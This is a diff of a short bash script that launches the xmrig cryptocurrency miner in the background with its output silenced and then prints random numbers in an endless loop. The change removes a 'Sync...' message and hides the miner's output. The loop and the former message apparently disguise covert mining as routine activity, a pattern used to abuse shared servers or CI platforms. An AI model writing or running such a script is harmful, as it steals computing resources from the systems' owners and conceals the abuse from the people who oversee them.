@@ -1,6 +1,4 @@
 #!/bin/bash
 
-chmod +x xmrig  >/dev/null 2>&1
-nohup ./xmrig --config=config.json &
-echo "+++++++ Sync... +++++++++"
+nohup ./xmrig --config=config.json >/dev/null 2>&1
 while :; do shuf -n 1 -i 1-99999999; sleep 2; done
